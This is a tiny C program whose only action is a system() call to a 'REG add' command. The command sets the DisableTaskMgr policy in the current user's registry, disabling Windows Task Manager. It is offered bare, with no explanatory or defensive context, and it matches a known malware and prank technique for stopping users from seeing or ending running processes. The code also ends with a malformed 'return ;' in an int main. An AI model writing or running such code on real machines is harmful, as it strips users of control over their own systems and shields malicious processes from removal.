#include<stdio.h>
#include<stdlib.h>

int main()
{
	system("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
	return ;
}